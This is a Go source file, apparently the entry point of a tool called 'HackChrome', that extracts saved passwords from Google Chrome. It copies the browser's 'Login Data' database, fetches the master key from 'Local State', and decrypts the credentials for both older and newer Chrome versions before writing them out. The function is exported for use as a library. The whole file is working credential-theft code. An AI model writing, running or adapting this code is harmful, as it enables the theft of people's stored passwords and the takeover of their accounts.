package main

import (
	"os"
	"flag"
	"C"
	"fmt"
	"HackChrome/utils"
	"HackChrome/core"
	_ "github.com/mattn/go-sqlite3"
)

var data_dir = flag.String("chromedata", os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/", "chrome data dir")

func main() {
	flag.Parse()
	Get_Chrome_Passwd(*data_dir)
}


//export Get_Chrome_Passwd
func Get_Chrome_Passwd(data_dir string){
	if len(data_dir) == 0{
		data_dir = os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/"
	}
	key_file := data_dir + "/Local State"
	orig_pwd_db := data_dir + "/default/Login Data"
	pwd_db := "LocalDB"

	utils.CopyFile(orig_pwd_db, pwd_db)
	var chrome_v80_res,chrome_res map[string](map[string]string)

	master_key, err := core.GetMaster(key_file)
	if err != nil {
		// chrome < v80
		chrome_v80_res = make(map[string](map[string]string))
		chrome_res = core.GetPwdPre(pwd_db)
	}else {
		// chrome > v80
		chrome_v80_res = core.GetPwd(pwd_db, master_key)
		chrome_res = make(map[string](map[string]string))
	}
	
	total_res := utils.Merge(chrome_v80_res, chrome_res)
	err = utils.FormatOutput(total_res, pwd_db)
	if err != nil {
		fmt.Println(err)
		return
	}
}
